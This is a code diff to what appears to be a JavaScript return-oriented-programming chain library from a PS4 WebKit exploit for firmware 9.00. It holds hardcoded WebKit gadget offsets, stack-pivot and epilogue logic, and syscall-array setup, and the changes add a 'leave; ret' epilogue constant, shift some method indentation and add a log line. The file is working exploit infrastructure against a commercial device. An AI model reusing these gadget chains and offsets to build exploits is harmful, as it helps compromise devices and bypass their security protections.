@@ -103,6 +103,20 @@ jmp qword ptr [rax]
 `;
 const jop5 = 'pop rsp; ret';
 
+// the ps4 firmware is compiled to use rbp as a frame pointer
+//
+// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
+// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
+// restore rbp (if needed) before the epilogue.
+//
+// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
+// pushed earlier before the pivot, thus restoring the old rbp).
+//
+// leave instruction equivalent:
+//     mov rsp, rbp
+//     pop rbp
+const rop_epilogue = 'leave; ret';
+
 const webkit_gadget_offsets = new Map(Object.entries({
     'pop rax; ret' : 0x0000000000051a12, // `58 c3`
     'pop rbx; ret' : 0x00000000000be5d0, // `5b c3`
@@ -212,7 +226,7 @@ class Chain900Base extends ChainBase {
 
     // sequence to pivot back and return
     push_end() {
-        this.push_gadget("leave; ret");
+        this.push_gadget(rop_epilogue);
     }
 
     check_is_branching() {
@@ -251,14 +265,14 @@ class Chain900Base extends ChainBase {
         this.push_gadget('mov qword ptr [rdi], rax; ret');
     }
 
-    push_clear_errno() {
+        push_clear_errno() {
         this.push_call(this.get_gadget('__error'));
         this.push_gadget('pop rsi; ret');
         this.push_value(0);
         this.push_gadget('mov dword ptr [rax], esi; ret');
     }
 
-    push_get_errno() {
+        push_get_errno() {
         this.push_gadget('pop rdi; ret');
         this.push_value(this.errno_addr);
 
@@ -268,13 +282,13 @@ class Chain900Base extends ChainBase {
         this.push_gadget('mov dword ptr [rdi], eax; ret');
     }
 
-    check_stale() {
+        check_stale() {
         if (this.is_stale) {
             throw Error('chain already ran, clean it first');
         }
         this.is_stale = true;
     }
-    check_is_empty() {
+        check_is_empty() {
         if (this.position === 0) {
             throw Error('chain is empty');
         }
@@ -353,6 +367,7 @@ export function init(Chain) {
     init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
     init_syscall_array(syscall_array, libkernel_base, 300 * KB);
     log('syscall_array:');
+    log(syscall_array);
     Chain.init_class(gadgets, syscall_array);
 }
 
